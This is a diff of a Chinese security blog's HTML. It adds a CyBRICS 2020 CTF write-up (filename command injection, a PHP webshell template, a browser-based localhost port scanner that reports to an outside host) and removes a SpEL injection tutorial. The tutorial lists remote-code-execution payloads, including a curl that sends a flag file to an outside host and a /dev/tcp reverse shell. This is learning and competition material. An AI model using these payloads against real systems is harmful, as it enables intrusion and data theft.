@@ -66,6 +66,192 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-CyBRICS2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/07/29/CyBRICS2020/" class="article-date">
+  <time class="dt-published" datetime="2020-07-29T04:55:37.052Z" itemprop="datePublished">2020-07-29</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/07/29/CyBRICS2020/">CyBRICS2020</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="CyBRICS-2020"><a href="#CyBRICS-2020" class="headerlink" title="CyBRICS  2020"></a>CyBRICS  2020</h1><h2 id="Hunt"><a href="#Hunt" class="headerlink" title="Hunt"></a>Hunt</h2><p>用burp修改返回包</p>
+<p>flag:<code>cybrics{Th0se_c4p7ch4s_c4n_hunter2_my_hunter2ing_hunter2}</code></p>
+<h2 id="Gif2png"><a href="#Gif2png" class="headerlink" title="Gif2png"></a>Gif2png</h2><p>源代码已上传</p>
+<pre><code>if not bool(re.match(&quot;^[a-zA-Z0-9_\-. &#39;\&quot;\=\$\(\)\|]*$&quot;, file.filename)):
+    exit()
+...
+def allowed_file(filename):
+    return &#39;.&#39; in filename and filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS
+allowed_file(file.filename)
+...
+command = subprocess.Popen(f&quot;ffmpeg -i &#39;uploads/{file.filename}&#39; \&quot;uploads/{uid}/%03d.png\&quot;&quot;, shell=True)</code></pre><p><code>filename=&quot;&#39;$(sleep 5)&#39;a.gif&quot;</code>来执行命令</p>
+<p>cybrics{imagesaresocoolicandrawonthem}</p>
+<h2 id="woc"><a href="#woc" class="headerlink" title="woc"></a>woc</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200726002857.png" alt="image631"></p>
+<p>calc.php</p>
+<pre><code class="php=">if (!preg_match(&#39;#(?=^([ %()*+\-./]+|\d+|M_PI|M_E|log|rand|sqrt|a?(sin|cos|tan)h?)+$)^([^()]*|([^()]*\((?&gt;[^()]+|(?4))*\)[^()]*)*)$#s&#39;, $field)) {
+        $value = &quot;BAD&quot;;
+    }else{
+    $value = eval(&quot;return $field;&quot;);
+}</code></pre>
+<pre><code>9999999999999999999:1.0E+25
+1/0:INF
+0/0:NAN
+log(0):-INF</code></pre><p>newtemplate.php</p>
+<pre><code class="php=">        if (strpos($html, &#39;&lt;?&#39;) !== false) {
+            $error = &quot;Bad chars&quot;;
+            break;
+        }
+        ...
+        file_put_contents(&quot;calcs/$userid/templates/$uuid.html&quot;, $html);</code></pre>
+<p>calc.php</p>
+<pre><code class="php=">file_put_contents(&quot;calcs/$userid/$calc.php&quot;, &quot;&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n&quot; . file_get_contents(&quot;inc/calclib.html&quot;) . file_get_contents(&quot;calcs/$userid/templates/$template.html&quot;));</code></pre>
+<p>html转php处，利用<code>/*</code>破坏结构，<code>file_get_contents(&quot;calcs/$userid/templates/$template.html&quot;))</code>处<code>*/</code>收尾，于是绕过成功</p>
+<p>新建template:</p>
+<pre><code>*/)).eval($_POST[1])?&gt;
+$requiredBlocks = [
+            &#39;id=&quot;back&quot;&#39;,
+            &#39;id=&quot;field&quot; name=&quot;field&quot;&#39;,
+            &#39;id=&quot;digit0&quot;&#39;,
+            &#39;id=&quot;digit1&quot;&#39;,
+            &#39;id=&quot;digit2&quot;&#39;,
+            &#39;id=&quot;digit3&quot;&#39;,
+            &#39;id=&quot;digit4&quot;&#39;,
+            &#39;id=&quot;digit5&quot;&#39;,
+            &#39;id=&quot;digit6&quot;&#39;,
+            &#39;id=&quot;digit7&quot;&#39;,
+            &#39;id=&quot;digit8&quot;&#39;,
+            &#39;id=&quot;digit9&quot;&#39;,
+            &#39;id=&quot;plus&quot;&#39;,
+            &#39;id=&quot;equals&quot;&#39;,
+        ];</code></pre><p>向calc post:<br><code>field=1/*&amp;share=1</code></p>
+<p>flag:cybrics{5aMe_7h1ng_W3_d0_3Ve5y_n16ht_P1nKY.Try_2_t4k3_0vEr_t3h_w0RLd}</p>
+<h2 id="Developer’s-Laptop"><a href="#Developer’s-Laptop" class="headerlink" title="Developer’s Laptop"></a>Developer’s Laptop</h2><p>看题目样子是xss题?SSRF?</p>
+<p>浏览器信息：HeadlessChrome/79.0.3945.79 </p>
+<p>填写脚本：</p>
+<pre><code class="javascript=">a=document.getElementsByClassName(&quot;form-control&quot;);a[1].value=&quot;WQLSaidXUtQAfD6ptJc7Yg&quot;;a[0].value=&quot;http://ccreater.top:60000&quot;;</code></pre>
+<p>返回包</p>
+<pre><code>HEAD / HTTP/1.1
+Host: ccreater.top:60000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.79 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Access-Control-Request-Method: POST
+Origin: prod.free-design-feedback-cybrics2020.ctf.su
+Referer: http://prod.free-design-feedback-cybrics2020.ctf.su
+</code></pre><p>等等开发人员的电脑？肯定一堆服务，内网扫描！</p>
+<p>http服务扫描：</p>
+<pre><code class="htmlmixed=">&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;script&gt;
+var from = 1;
+var complete = true;
+var clear = false;
+function check(text){
+    var linkEl = document.head.querySelector(&#39;link[href*=&quot;&#39;+text+&#39;&quot;&#39;);
+    var cssLoaded = Boolean(linkEl.sheet);
+    linkEl.addEventListener(&#39;load&#39;, function () {
+        console.log(text)
+        // log
+        fetch(&quot;http://ccreater.top:60010/log.php?log=&quot;+text)
+            .then(r=&gt;r.text())
+            .then(d=&gt;{console.log(&quot;log success&quot;)})
+        // log end
+    });
+}
+function clearstyle(clear_from ,clear_to){
+    clear = true;
+    console.log(&quot;clear task start&quot;);
+    while(clear_to&lt;=clear_from){
+            document.head.querySelector(&#39;link[href$=&quot;:&#39;+clear_to+&#39;&quot;&#39;).remove();
+            clear_to++;
+    }
+    clear = false;
+    console.log(&quot;clear task end&quot;);
+}
+function make(text){
+    head = document.getElementsByTagName(&#39;head&#39;)[0];
+    var port = text;
+    var url = &quot;http://127.0.0.1:&quot;+port,
+    link = document.createElement(&#39;link&#39;);
+    link.rel = &quot;stylesheet&quot;;
+    link.href = url;
+    head.appendChild(link);
+    check(text);
+}
+async function scan(){
+    var to = from + 80 &gt; 65535 ? 65535 : from + 80;
+    for(var i=from;i&lt;to;i++){
+        make(String(i));
+    }
+    from +=80;
+    setTimeout(()=&gt;{clearstyle(from,to);},5000);
+};
+
+async function listener (){
+    console.log(&quot;listener works,from:&quot;+from+&quot;,complete:&quot;+complete);
+    if(from &lt; 65535){
+        setTimeout(listener,5000);
+        if(complete &amp;&amp; !clear){
+            console.log(&quot;new task!&quot;);
+            scan()
+                .then(()=&gt;{complete = true;})
+            complete = false;
+        }
+    }
+
+}
+listener()
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>虽然我猜到了有内网服务但是到最后我还是没有扫到。。</p>
+<p>脚本在本地是可以跑的，但是服务器上就不行，可能是因为有时间限制吧，遗憾。</p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/07/29/CyBRICS2020/">http://blog.ccreater.top/2020/07/29/CyBRICS2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/07/29/CyBRICS2020/" data-id="ckd6wbuc50000x4v05bg26sz7" data-title="CyBRICS2020" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
     <article id="post-geekpwn2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/07/19/geekpwn2020/" class="article-date">
@@ -2757,196 +2943,6 @@ app.listen(port, () =&gt; console.log(`Example app listening at http://localhost
 
 
   
-    <article id="post-SpEL表达式注入漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/05/06/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
-  <time class="dt-published" datetime="2020-05-06T07:13:00.196Z" itemprop="datePublished">2020-05-06</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/web/">web</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/05/06/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">SpEL表达式注入漏洞</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="SpEL表达式注入漏洞"><a href="#SpEL表达式注入漏洞" class="headerlink" title="SpEL表达式注入漏洞"></a>SpEL表达式注入漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Spring Expression Language（简称SpEL）。SpEL引擎作为Spring 组合里的表达式解析的基础 ，但它不直接依赖于Spring,可独立使用。 </p>
-<h2 id="SpEL测试代码"><a href="#SpEL测试代码" class="headerlink" title="SpEL测试代码"></a>SpEL测试代码</h2><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
-Expression exp = parser.parseExpression(&quot;&#39;Hello World&#39;&quot;);
-//Expression randomPhrase = parser.parseExpression(&quot;123&quot;,new TemplateParserContext());
-String message = (String) exp.getValue();
-//String message = exp.getValue(String.class);
-</code></pre>
-<p> 上述代码含义为首先创建<code>ExpressionParser</code>解析表达式，之后放置表达式，最后通过<code>getValue</code>方法执行表达式，默认容器是spring本身的容器：<code>ApplicationContext</code>。 </p>
-<p><code>TemplateParserContext</code>添加了 <strong>表达式模板</strong> 解析器</p>
-<h2 id="SpEL语法"><a href="#SpEL语法" class="headerlink" title="SpEL语法"></a>SpEL语法</h2><h3 id="使用SpEL接口进行表达式求值"><a href="#使用SpEL接口进行表达式求值" class="headerlink" title="使用SpEL接口进行表达式求值"></a>使用SpEL接口进行表达式求值</h3><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
-Expression exp = parser.parseExpression(&quot;&#39;Hello World&#39;&quot;);
-String message = (String) exp.getValue();</code></pre>
-<h3 id="方法调用，访问属性，调用构造函数"><a href="#方法调用，访问属性，调用构造函数" class="headerlink" title="方法调用，访问属性，调用构造函数"></a>方法调用，访问属性，调用构造函数</h3><p>这些都和平时的java没什么不同,demo:</p>
-<p>访问属性：</p>
-<pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
-Expression exp = parser.parseExpression(&quot;&#39;123&#39;.bytes&quot;);
-System.out.println((Object)exp.getValue());</code></pre>
-<p>方法调用：</p>
-<pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
-Expression exp = parser.parseExpression(&quot;&#39;123&#39;.length()&quot;);
-System.out.println((Object)exp.getValue());</code></pre>
-<p>调用构造函数：</p>
-<pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
-Expression exp = parser.parseExpression(&quot;new String(1234)&quot;);
-System.out.println((Object)exp.getValue());</code></pre>
-<h3 id="访问根对象属性方法等"><a href="#访问根对象属性方法等" class="headerlink" title="访问根对象属性方法等"></a>访问根对象属性方法等</h3><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
-        Expression exp = parser.parseExpression(&quot;fucker+tou()&quot;);
-        System.out.println((Object)exp.getValue(new Object(){
-            public String fucker=&quot;fucker&quot;;
-            public String tou(){
-                return &quot;toutoutou&quot;;
-            };
-        }));</code></pre>
-<p>结果：<code>fuckertoutoutou</code></p>
-<h3 id="传递根对象-root"><a href="#传递根对象-root" class="headerlink" title="传递根对象/#root"></a>传递根对象/#root</h3><h4 id="StandardEvaluationContext"><a href="#StandardEvaluationContext" class="headerlink" title="StandardEvaluationContext"></a>StandardEvaluationContext</h4><pre><code class="java">// Create and set a calendar
-GregorianCalendar c = new GregorianCalendar();
-c.set(1856, 7, 9);
-
-// The constructor arguments are name, birthday, and nationality.
-Inventor tesla = new Inventor(&quot;Nikola Tesla&quot;, c.getTime(), &quot;Serbian&quot;);
-
-ExpressionParser parser = new SpelExpressionParser();
-Expression exp = parser.parseExpression(&quot;name&quot;);
-
-EvaluationContext context = new StandardEvaluationContext(tesla);
-String name = (String) exp.getValue(context);</code></pre>
-<p>这里的root object 是 tesla,<code>parser.parseExpression(&quot;name&quot;);</code>会返回tesla的name属性</p>
-<h4 id="getValue"><a href="#getValue" class="headerlink" title="getValue"></a>getValue</h4><pre><code class="java">// Create and set a calendar
-GregorianCalendar c = new GregorianCalendar();
-c.set(1856, 7, 9);
-
-// The constructor arguments are name, birthday, and nationality.
-Inventor tesla = new Inventor(&quot;Nikola Tesla&quot;, c.getTime(), &quot;Serbian&quot;);
-
-ExpressionParser parser = new SpelExpressionParser();
-Expression exp = parser.parseExpression(&quot;name&quot;);
-String name = (String) exp.getValue(tesla);</code></pre>
-<h3 id="数组和列表和字典-取值"><a href="#数组和列表和字典-取值" class="headerlink" title="数组和列表和字典 取值"></a>数组和列表和字典 取值</h3><p> 属性名的第一个字母可以是大小写敏感的。数组和列表的内容可以使用方括号来标记 </p>
-<pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
-
-// Inventions Array
-StandardEvaluationContext teslaContext = new StandardEvaluationContext(tesla);
-
-// evaluates to &quot;Induction motor&quot;
-String invention = parser.parseExpression(&quot;inventions[3]&quot;).getValue(
-        teslaContext, String.class);
-
-// Members List
-StandardEvaluationContext societyContext = new StandardEvaluationContext(ieee);
-
-// evaluates to &quot;Nikola Tesla&quot;
-String name = parser.parseExpression(&quot;Members[0].Name&quot;).getValue(
-        societyContext, String.class);
-
-// List and Array navigation
-// evaluates to &quot;Wireless communication&quot;
-String invention = parser.parseExpression(&quot;Members[0].Inventions[6]&quot;).getValue(
-        societyContext, String.class);</code></pre>
-<p> Maps的值由方括号内指定字符串的Key来标识引用。在下面这个例子中，因为Officers map的Key是string类型，我们可以用过字符串常量指定。 </p>
-<pre><code class="java">// Officer&#39;s Dictionary
-
-Inventor pupin = parser.parseExpression(&quot;Officers[&#39;president&#39;]&quot;).getValue(
-        societyContext, Inventor.class);
-
-// evaluates to &quot;Idvor&quot;
-String city = parser.parseExpression(&quot;Officers[&#39;president&#39;].PlaceOfBirth.City&quot;).getValue(
-        societyContext, String.class);
-
-// setting values
-parser.parseExpression(&quot;Officers[&#39;advisors&#39;][0].PlaceOfBirth.Country&quot;).setValue(
-        societyContext, &quot;Croatia&quot;);</code></pre>
-<h3 id="声明数组列表和字典"><a href="#声明数组列表和字典" class="headerlink" title="声明数组列表和字典"></a>声明数组列表和字典</h3><p>列表：</p>
-<pre><code class="java">// evaluates to a Java list containing the four numbers
-List numbers = (List) parser.parseExpression(&quot;{1,2,3,4}&quot;).getValue(context);
-
-List listOfLists = (List) parser.parseExpression(&quot;{{'a','b'},{'x','y'}}&quot;).getValue(context);</code></pre>
-<p>字典：</p>
-<pre><code class="java">// evaluates to a Java map containing the two entries
-Map inventorInfo = (Map) parser.parseExpression(&quot;{name:&#39;Nikola&#39;,dob:&#39;10-July-1856&#39;}&quot;).getValue(context);
-
-Map mapOfMaps = (Map) parser.parseExpression(&quot;{name:{first:&#39;Nikola&#39;,last:&#39;Tesla&#39;},dob:{day:10,month:&#39;July&#39;,year:1856}}&quot;).getValue(context);</code></pre>
-<p>数组：</p>
-<p> 数组可以使用类似于Java的语法创建，创建时可以事先指定数组的容量大小、这个是可选的。 在创建多维数组时还不支持事先指定初始化的值。</p>
-<pre><code class="java">int[] numbers1 = (int[]) parser.parseExpression(&quot;new int[4]&quot;).getValue(context);</code></pre>
-<h3 id="T操作符"><a href="#T操作符" class="headerlink" title="T操作符"></a>T操作符</h3><p><code>T()</code>运算符会调用类作用域的方法和常量。 </p>
-<p> T操作符是一个特殊的操作符、可以同于指定java.lang.Class的实例（类型）。静态方法也可以通过这个操作符调用。  *<em>T()引用java.lang包里面的类型不需要限定包全名，但是其他类型的引用必须要。 *</em></p>
-<pre><code class="java">Class dateClass = parser.parseExpression(&quot;T(java.util.Date)&quot;).getValue(Class.class);
-
-Class stringClass = parser.parseExpression(&quot;T(String)&quot;).getValue(Class.class);
-
-boolean trueValue = parser.parseExpression(
-        &quot;T(java.math.RoundingMode).CEILING &gt;= T(java.math.RoundingMode).FLOOR&quot;)
-        .getValue(Boolean.class);</code></pre>
-<h3 id="表达式模板"><a href="#表达式模板" class="headerlink" title="表达式模板"></a>表达式模板</h3><p> 表达式模板运行在一段文本中混合包含一个或多个求值表达式模块。各个求值块都通过可被自定义的前后缀字符分隔，一个通用的选择是使用#{ }作为分隔符。 </p>
-<pre><code class="java">String randomPhrase = parser.parseExpression(
-        &quot;random number is #{T(java.lang.Math).random()}&quot;,
-        new TemplateParserContext()).getValue(String.class);</code></pre>
-<p>结果：<code>random number is xxxx</code></p>
-<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p> 表达式中的变量可以通过语法#变量名使用。变量可以在StandardEvaluationContext中通过方法setVariable设置。 </p>
-<h4 id="this和root变量"><a href="#this和root变量" class="headerlink" title="this和root变量"></a>this和root变量</h4><p> #this变量永远指向当前表达式正在求值的对象（这时不需要限定全名）。变量#root总是指向根上下文对象。#this在表达式不同部分解析过程中可能会改变，但是#root总是指向根 </p>
-<h3 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h3><p>T()和new一个类时 除了java.lang下的类，其他类都要需要需要限定包全名</p>
-<h2 id="SpEL导致的任意命令执行"><a href="#SpEL导致的任意命令执行" class="headerlink" title="SpEL导致的任意命令执行"></a>SpEL导致的任意命令执行</h2><h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><pre><code>T(java.lang.Runtime).getRuntime().exec(&quot;nslookup a.com&quot;)
-T(Thread).sleep(10000)
-#this.getClass().forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;nslookup a.com&#39;)
-new java.lang.ProcessBuilder({&#39;nslookup a.com&#39;}).start()</code></pre><p>利用反射构造绕过黑名单</p>
-<pre><code>#{T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;curl fg5hme.ceye.io/`cat flag_j4v4_chun|base64|tr &#39;\n&#39; &#39;-&#39;`&quot;})}</code></pre><p>利用ScriptEngineManager构造绕过黑名单</p>
-<pre><code class="java">#{T(javax.script.ScriptEngineManager).newInstance()
-    .getEngineByName(&quot;nashorn&quot;)
-        .eval(&quot;s=[3];s[0]=&#39;/bin/bash&#39;;s[1]=&#39;-c&#39;;s[2]=&#39;ex&quot;+&quot;ec 5&lt;&gt;/dev/tcp/1.2.3.4/2333;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#39;;java.la&quot;+&quot;ng.Run&quot;+&quot;time.getRu&quot;+&quot;ntime().ex&quot;+&quot;ec(s);&quot;)}</code></pre>
-<pre><code>&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[15]
-    .invoke(&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[7]
-        .invoke(null),&#39;curl 172.17.0.1:9898&#39;)</code></pre><p> 除此以外当执行的系统命令被过滤或者被URL编码掉时我们可以通过<code>String</code>类动态生成字符<br>如要执行的命令为<code>open /Applications/Calculator.app</code>我们可以采用<code>new java.lang.String(new byte[]{,,...})</code>或者<code>concat(T(java.lang.Character).toString())</code>嵌套来绕过 </p>
-<pre><code>T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(&quot;jdk.jshell.JShell&quot;,true).Methods[6].invoke(null,{}).eval(&#39;whatever java code in one statement&#39;).toString()</code></pre><h3 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h3><h4 id="new被过滤"><a href="#new被过滤" class="headerlink" title="new被过滤"></a>new被过滤</h4><p>可以用NEW</p>
-<h3 id="一些相关的ctf题目"><a href="#一些相关的ctf题目" class="headerlink" title="一些相关的ctf题目"></a>一些相关的ctf题目</h3><h4 id="de1ctf2020-cal"><a href="#de1ctf2020-cal" class="headerlink" title="de1ctf2020 cal"></a>de1ctf2020 cal</h4><h3 id="SpEL提供的两个EvaluationContext的区别"><a href="#SpEL提供的两个EvaluationContext的区别" class="headerlink" title="SpEL提供的两个EvaluationContext的区别"></a>SpEL提供的两个<code>EvaluationContext</code>的区别</h3><p>SpEL提供的两个<code>EvaluationContext</code>的区别。<br>（EvaluationContext评估表达式以解析属性，方法或字段并帮助执行类型转换时使用该接口。有两个开箱即用的实现。）</p>
-<ul>
-<li>SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。</li>
-<li>StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</li>
-</ul>
-<p><code>SimpleEvaluationContext</code>旨在仅支持SpEL语言语法的一个子集。它不包括 Java类型引用，构造函数和bean引用。</p>
-<p>所以说指定正确<code>EvaluationContext</code>，是防止SpEl表达式注入漏洞产生的首选，之前出现过相关的SpEL表达式注入漏洞，其修复方式就是使用<code>SimpleEvaluationContext</code>替代<code>StandardEvaluationContext</code>。</p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p> <a href="http://rui0.cn/archives/1043" target="_blank" rel="noopener">http://rui0.cn/archives/1043</a> </p>
-<p> <a href="http://ifeve.com/spring-6-spel/" target="_blank" rel="noopener">http://ifeve.com/spring-6-spel/</a>  文档</p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/05/06/SpEL表达式注入漏洞/">http://blog.ccreater.top/2020/05/06/SpEL表达式注入漏洞/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/05/06/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cka3ckr22000iv4v0a3rqb815" data-title="SpEL表达式注入漏洞" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -3004,6 +3000,10 @@ new java.lang.ProcessBuilder({&#39;nslookup a.com&#39;}).start()</code></pre><p>
       <ul>
         
           <li>
+            <a href="/2020/07/29/CyBRICS2020/">CyBRICS2020</a>
+          </li>
+        
+          <li>
             <a href="/2020/07/19/geekpwn2020/">geekpwn2020</a>
           </li>
         
@@ -3017,10 +3017,6 @@ new java.lang.ProcessBuilder({&#39;nslookup a.com&#39;}).start()</code></pre><p>
         
           <li>
             <a href="/2020/06/30/bypass_disable_function_open_basedir/">bypass_disable_function_open_basedir</a>
-          </li>
-        
-          <li>
-            <a href="/2020/06/30/tctf2020/">tctf2020</a>
           </li>
         
       </ul>
